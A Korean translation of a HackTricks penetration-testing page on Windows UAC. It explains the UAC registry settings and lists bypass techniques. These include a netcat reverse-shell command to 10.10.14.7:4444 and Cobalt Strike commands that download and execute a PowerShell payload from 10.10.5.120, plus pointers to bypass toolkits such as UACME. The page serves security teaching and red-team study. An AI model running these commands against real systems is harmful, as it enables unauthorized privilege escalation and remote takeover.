# UAC - 사용자 계정 제어

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 제로부터 영웅이 될 때까지 AWS 해킹을 배우세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사가 HackTricks에 광고되길 원하거나** **PDF 형식으로 HackTricks를 다운로드**하려면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* **💬 [Discord 그룹](https://discord.gg/hRep4RUj7f)** 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**를 팔로우**하세요.
* **HackTricks** 및 **HackTricks Cloud** 깃허브 저장소로 PR을 제출하여 해킹 트릭을 공유하세요.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)를 사용하여 세계에서 **가장 고급** 커뮤니티 도구를 활용한 **워크플로우를 쉽게 구축**하고 **자동화**하세요.\
오늘 바로 액세스하세요:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[사용자 계정 제어 (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)는 **승격된 활동에 대한 동의 프롬프트를 활성화**하는 기능입니다. 응용 프로그램은 서로 다른 `무결성` 수준을 갖고 있으며 **높은 수준**의 프로그램은 **시스템을 잠재적으로 손상시킬 수 있는 작업을 수행**할 수 있습니다. UAC가 활성화되면 응용 프로그램과 작업은 항상 관리자가 명시적으로 이러한 응용 프로그램/작업이 시스템에 대한 관리자 수준 액세스 권한을 갖도록 허용하지 않는 한 항상 **관리자가 아닌 계정의 보안 컨텍스트에서 실행**됩니다. 이는 관리자가 의도하지 않은 변경으로부터 보호하는 편의 기능이지만 보안 경계로 간주되지는 않습니다.

무결성 수준에 대한 자세한 정보는 다음을 참조하세요:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

UAC가 적용되면 관리자 사용자에게 표준 사용자 키와 관리자 권한을 갖는 토큰이 2개 제공됩니다.

이 [페이지](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)는 UAC가 어떻게 작동하는지에 대해 상세히 설명하며 로그온 프로세스, 사용자 경험 및 UAC 아키텍처를 포함합니다. 관리자는 로컬 수준에서 UAC가 조직에 특정하게 작동하는 방법을 구성하기 위해 보안 정책을 사용할 수 있으며(secpol.msc 사용), 또는 Active Directory 도메인 환경에서 그룹 정책 객체(GPO)를 통해 구성 및 배포할 수 있습니다. 다양한 설정에 대해 자세히 설명된 내용은 [여기](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)에서 확인할 수 있습니다. UAC에 대해 설정할 수 있는 10가지 그룹 정책 설정이 있습니다. 다음 표는 추가 세부 정보를 제공합니다:

| 그룹 정책 설정                                                                                                                                                                                                                                                                                                                                                           | 레지스트리 키                | 기본 설정                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [내장 관리자 계정에 대한 관리자 승인 모드 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | 비활성화                                                     |
| [UIAccess 응용 프로그램이 안전한 데스크톱을 사용하지 않고 승격을 위해 프롬프트할 수 있도록 허용하는 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | 비활성화                                                     |
| [관리자 승인 모드에서 관리자를 위한 승격 프롬프트 동작 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Windows 이진 파일에 대한 동의 프롬프트                  |
| [표준 사용자를 위한 승격 프롬프트 동작 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | 안전한 데스크톱에서 자격 증명 프롬프트                 |
| [응용 프로그램 설치 감지 및 승격을 위해 프롬프트하는 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | 활성화 (홈의 기본 설정) 비활성화 (기업의 기본 설정) |
| [서명 및 유효성이 검증된 실행 파일만 승격하는 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | 비활성화                                                     |
| [안전한 위치에 설치된 UIAccess 응용 프로그램만 승격하는 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | 활성화                                                      |
| [모든 관리자를 관리자 승인 모드에서 실행하는 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | 활성화                                                      |
| [승격 프롬프트 시 안전한 데스크톱으로 전환하는 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | 활성화                                                      |
| [파일 및 레지스트리 쓰기 실패를 사용자별 위치로 가상화하는 사용자 계정 제어](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | 활성화                                                      |
### UAC Bypass Theory

일부 프로그램은 사용자가 관리자 그룹에 속해 있다면 **자동으로 자동 상승**됩니다. 이진 파일에는 내부적으로 _**Manifests**_가 있으며 _**autoElevate**_ 옵션의 값이 _**True**_로 설정되어 있어야 합니다. 또한 해당 이진 파일은 **Microsoft에 의해 서명**되어 있어야 합니다.

그런 다음, **UAC를 우회**하여 (중간 보안 수준에서 높은 수준으로 상승) 일부 공격자는 이러한 종류의 이진 파일을 사용하여 **임의의 코드를 실행**합니다. 이는 **높은 수준의 무결성 프로세스**에서 실행되기 때문입니다.

이진 파일의 _**Manifest**_를 확인하려면 Sysinternals의 _**sigcheck.exe**_ 도구를 사용할 수 있습니다. 또한 _Process Explorer_ 또는 _Process Monitor_ (Sysinternals의)를 사용하여 프로세스의 **무결성 수준**을 확인할 수 있습니다.

### Check UAC

UAC가 활성화되어 있는지 확인하려면 다음을 수행하십시오:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
만약 **`1`**이라면 UAC가 **활성화**되어 있고, **`0`**이거나 **존재하지 않는 경우**에는 UAC가 **비활성화**됩니다.

그런 다음, 구성된 **레벨**을 확인하십시오:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* 만약 **`0`**이면, UAC는 나타나지 않습니다 (**비활성화**와 같음)
* 만약 **`1`**이면, 관리자는 이진 파일을 높은 권한으로 실행하기 위해 **사용자 이름과 암호를 요청**받습니다 (안전한 데스크톱에서)
* 만약 **`2`**이면 (**항상 알림**) UAC는 관리자가 높은 권한으로 무언가를 실행하려고 할 때 항상 확인을 요청합니다 (안전한 데스크톱에서)
* 만약 **`3`**이면 `1`과 유사하지만 안전한 데스크톱에서 필요하지 않습니다
* 만약 **`4`**이면 `2`와 유사하지만 안전한 데스크톱에서 필요하지 않습니다
* 만약 **`5`**이면(**기본값**) 관리자에게 Windows 이진 파일을 높은 권한으로 실행할 것인지 확인 요청합니다

그런 다음 **`LocalAccountTokenFilterPolicy`** 값 확인해야 합니다.\
값이 **`0`**이면, **RID 500** 사용자(**기본 관리자**)만 UAC 없이 **관리자 작업을 수행**할 수 있으며, `1`이면 **"관리자" 그룹 내의 모든 계정**이 수행할 수 있습니다.

마지막으로 **`FilterAdministratorToken`** 키의 값을 확인해야 합니다.\
**`0`**(기본값)이면, **기본 관리자 계정이** 원격 관리 작업을 수행할 수 있고, **`1`**이면 기본 계정 관리자가 **원격 관리 작업을 수행할 수 없습니다**(`LocalAccountTokenFilterPolicy`가 `1`로 설정되어 있지 않는 한).

#### 요약

* `EnableLUA=0` 또는 **존재하지 않으면**, **누구에게도 UAC가 없음**
* `EnableLua=1` 및 **`LocalAccountTokenFilterPolicy=1`이면, 누구에게도 UAC가 없음**
* `EnableLua=1` 및 **`LocalAccountTokenFilterPolicy=0` 및 `FilterAdministratorToken=0`이면, RID 500(기본 관리자)에 대해 UAC가 없음**
* `EnableLua=1` 및 **`LocalAccountTokenFilterPolicy=0` 및 `FilterAdministratorToken=1`이면, 모두에게 UAC가 있음**

이 모든 정보는 **metasploit** 모듈을 사용하여 수집할 수 있습니다: `post/windows/gather/win_privs`

또한 사용자의 그룹을 확인하고 무결성 수준을 얻을 수 있습니다:
```
net user %username%
whoami /groups | findstr Level
```
## UAC 우회

{% hint style="info" %}
피해자에게 그래픽 액세스 권한이 있는 경우 UAC 우회는 간단합니다. UAC 프롬프트가 나타날 때 "예"를 클릭할 수 있습니다.
{% endhint %}

UAC 우회는 다음 상황에서 필요합니다: **UAC가 활성화되어 있고, 프로세스가 중간 무결성 컨텍스트에서 실행되며 사용자가 관리자 그룹에 속한 경우**입니다.

**UAC가 최고 보안 수준(항상)에 있는 경우 다른 수준(기본값) 중 어느 것보다 우회하기가 훨씬 어렵다는 점을 언급하는 것이 중요합니다.**

### UAC 비활성화

UAC가 이미 비활성화된 경우 (`ConsentPromptBehaviorAdmin`이 **`0`**) 다음과 같은 방법으로 **관리자 권한(높은 무결성 수준)으로 역쉘을 실행**할 수 있습니다:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### 토큰 복제를 사용한 UAC 우회

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### 매우 기본적인 UAC "우회" (전체 파일 시스템 액세스)

관리자 그룹에 속한 사용자가 있는 셸이 있다면 SMB(파일 시스템)을 통해 C$를 **마운트**할 수 있으며, 새 디스크에 로컬로 연결하여 파일 시스템 내의 모든 것에 **액세스**할 수 있습니다(심지어 관리자 홈 폴더까지).

{% hint style="warning" %}
**이 요령은 더 이상 작동하지 않는 것으로 보입니다**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC 바이패스 with cobalt strike

Cobalt Strike 기술은 UAC가 최대 보안 수준으로 설정되지 않은 경우에만 작동합니다.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 및 **Metasploit**에는 **UAC**를 **우회**하는 여러 모듈이 있습니다.

### KRBUACBypass

[https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)의 문서 및 도구

### UAC 우회 공격

[**UACME**](https://github.com/hfiref0x/UACME)는 여러 UAC 우회 공격을 모은 것입니다. **Visual Studio 또는 msbuild를 사용하여 UACME를 컴파일해야** 합니다. 컴파일하면 여러 실행 파일이 생성됩니다 (예: `Source\Akagi\outout\x64\Debug\Akagi.exe`), **어떤 것이 필요한지 알아야** 합니다.\
일부 우회 방법은 **사용자에게 무언가가 발생하고 있다는 경고를 알리는 다른 프로그램을 실행**할 수 있으므로 **주의**해야 합니다.

UACME에는 각 기술이 작동하기 시작한 **빌드 버전**이 있습니다. 해당 버전을 찾아볼 수 있습니다:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
### UAC Bypass with GUI

만약 **GUI에 액세스**할 수 있다면 UAC 프롬프트가 표시될 때 **그냥 수락**하면 되며, 별도의 우회가 필요하지 않습니다. 따라서 GUI에 액세스하면 UAC를 우회할 수 있습니다.

또한, 누군가가 사용한 GUI 세션에 액세스하면(아마도 RDP를 통해) **일부 도구가 관리자 권한으로 실행**되어 있을 수 있으며, 여기서 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)와 같은 도구를 사용하여 예를 들어 **cmd를 관리자 권한으로 직접 실행**할 수 있습니다. 이는 조금 더 **은밀**할 수 있습니다.
